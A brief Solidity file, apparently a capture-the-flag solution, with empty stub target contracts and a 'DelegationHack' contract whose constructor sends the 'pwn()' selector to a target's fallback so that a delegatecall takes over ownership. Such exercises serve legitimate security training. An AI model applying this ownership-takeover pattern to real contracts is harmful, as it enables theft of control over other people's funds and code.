pragma solidity ^0.4.18;

contract Delegate {

  function pwn() public {  }
}

contract Delegation {

  function() public { }
}

contract DelegationHack{
    address public me;
    
   function DelegationHack(address _instanceaddr) public {
       Delegation(_instanceaddr).call(bytes4(keccak256("pwn()")));
   }
}